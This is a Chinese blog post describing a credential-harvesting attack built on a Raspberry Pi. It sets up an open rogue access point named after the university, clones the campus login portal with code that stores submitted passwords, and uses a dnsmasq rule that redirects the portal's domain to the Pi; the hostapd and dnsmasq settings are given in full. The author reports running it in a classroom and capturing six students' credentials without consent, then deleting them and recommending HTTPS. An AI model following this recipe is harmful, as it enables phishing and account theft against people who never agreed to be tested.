---
layout: post
title: Raspberry实现简单的DNS劫持
categories: raspberry
---

> 受到一些无线路由器的启发，想在连接无线AP后通过访问一个本地域名来实现访问树莓派IP的目的，Google得到可以设置本地DNS进行解析。然后就突然想到可以做一次简单的DNS劫持测试。

<!-- more -->

### 计划
* 树莓派开启无线AP，并设置SSID为NEU，取消密码。  
* 拷贝学校IP控制网关页面到树莓派上，并进行适当修改，使其在点击“连接网络”后存储登录信息到树莓派数据库中。  
* 设置本地DNS，将IP控制网关的域名解析到树莓派的IP上。  

### 无线AP设置  
* 在上一篇文章中我们已经基本设置好了树莓派的无线AP，其中树莓派的IP为4.3.2.1。  
* 更改无线AP的SSID和密码：  
  `$ sudo vim /etc/hostapd/hostapd.conf`  
  原本的内容为：  
  ```
  interface=wlan0  
  driver=nl80211  
  ssid=Raspberry AP  /***change***/  
  hw_mode=g  
  channel=7  
  wmm_enabled=1  
  macaddr_acl=0  
  auth_algs=1  
  ignore_broadcast_ssid=0  
  wpa=2  /***change***/  
  wpa_passphrase=12345678  /***delete***/  
  wpa_key_mgmt=WPA-PSK  /***delete***/  
  rsn_pairwise=CCMP  
  ```
  修改之后为：  
  ```
  interface=wlan0  
  driver=nl80211  
  ssid=NEU  
  hw_mode=g  
  channel=7  
  wmm_enabled=1  
  macaddr_acl=0  
  auth_algs=1  
  ignore_broadcast_ssid=0  
  wpa=0  
  rsn_pairwise=CCMP  
  ```
* 重启hostapd服务：  
  `$ sudo systemctl restart hostapd`  

### 网页拷贝
* 分别访问电脑版和手机版的IP控制网关，在Chromium浏览器中右键另存为就得到了当前页面的html代码以及该页面用到的文件。   
* 将下载到的文件及文件夹全部移动到`/var/www/html/`目录下。  
* 调整文件结构。例如：  
  * 新建`css/`文件夹将所有的css文件放进去；  
  * 新建`includes/`文件夹将html页面相同的布局放进去；  
  * 将html文件改为php文件。  
* 新建`index.php`，判断访问者是手机还是电脑，并跳转到对应页面。  
  `$ vim index.php`  
  （代码来源自网络）  
  （其中`srun_portal_phone.php`是手机页面，`srun_portal_pc.php`是电脑页面）  
  {% highlight php %}
  <?php  
  function is_mobile_request()  
  {  
	  $_SERVER['ALL_HTTP'] = isset($_SERVER['ALL_HTTP']) ? $_SERVER['ALL_HTTP'] : '';  
	  $mobile_browser = '0';  
	  if(preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|iphone|ipad|ipod|android|xoom)/i', strtolower($_SERVER['HTTP_USER_AGENT'])))  
		  $mobile_browser++;  
	  if((isset($_SERVER['HTTP_ACCEPT'])) and (strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') !== false))  
		  $mobile_browser++;  
	  if(isset($_SERVER['HTTP_X_WAP_PROFILE']))  
		  $mobile_browser++;  
	  if(isset($_SERVER['HTTP_PROFILE']))  
		  $mobile_browser++;  
		  $mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'],0,4));  
	  $mobile_agents = array(  
      'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',  
      'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',  
      'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',  
      'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',  
      'newt','noki','oper','palm','pana','pant','phil','play','port','prox',  
      'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',  
      'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',  
      'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',  
      'wapr','webc','winw','winw','xda','xda-'
      );  
	  if(in_array($mobile_ua, $mobile_agents))  
		  $mobile_browser++;  
	  if(strpos(strtolower($_SERVER['ALL_HTTP']), 'operamini') !== false)  
		  $mobile_browser++;  
	  // Pre-final check to reset everything if the user is on Windows  
	  if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'windows') !== false)  
		  $mobile_browser=0;  
	  // But WP7 is also Windows, with a slightly different characteristic  
	  if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'windows phone') !== false)  
		  $mobile_browser++;  
	  if($mobile_browser>0)   
		  echo '<meta http-equiv="refresh" content="0;url=srun_portal_phone.php?url=&ac_id=1">';  
	  else  
		  echo '<meta http-equiv="refresh" content="0;url=srun_portal_pc.php?url=&ac_id=1">'; 
  }
	  is_mobile_request();
  ?>
  {% endhighlight %}
* 修改文件内容。例如：  
  * 将代码中https全部替换为http；  
  * 删除各个页面中可能保留的帐号密码；  
  * 修改php代码，自动将表单提交内容存入树莓派数据库。  

### DNS解析
* 添加解析：  
  `$ sudo vim /etc/dnsmasq.conf`  
  在第一行添加：  
  `address = /ipgw.neu.edu.cn/4.3.2.1`  
  表示将`ipgw.neu.edu.cn`解析到本地的web服务器上。  
* 重启服务：  
  `$ sudo systemctl restart dnsmasq`  

### 测试
* 真实网页：  
  ![ipgw-T-https](/public/image/ipgw-T-https.webp)
* 虚假网页：  
  ![ipgw-F-http](/public/image/ipgw-F-http.webp)
* 用户名输入：20160000  
  密码输入：2016abcd  
  点击连接网络，此时在树莓派的数据库中就可以看到：  
  ![ipgw-test](/public/image/ipgw-test.webp)

### 总结
* 实际上，由于本校的IP控制网关启用了https，这种DNS劫持的方法应该是没有实际意义的。  
  ![ipgw-F-https](/public/image/ipgw-F-https.webp)
  在保存书签的时候，Chrome和Safari浏览器会默认保存为`https://ipgw.neu.edu.cn`；如果手动输网址，这两个浏览器也会自动补全为`https://ipgw.neu.edu.cn`。所以我本来对之后的实际测试是不抱任何希望的。  
  然而在将树莓派带到教室进行测试后，两节课之后数据库还是多了6名同学的数据。测试结束后我先删除了数据库数据，然后又分别向这6位同学发送邮件提醒其修改浏览器书签，顺便建议他们修改密码。  
  > 维基百科：  
  > http是不安全的，且攻击者通过监听和中间人攻击等手段，可以获取网站帐户和敏感信息等。https被设计为可防止前述攻击，并（在没有使用旧版本的SSL时）被认为是安全的。  
* 为了防范这种DNS劫持，最好的办法就是使用https。  
* 现在就检查一遍你的书签，把可以替换的http全部替换为https吧！  
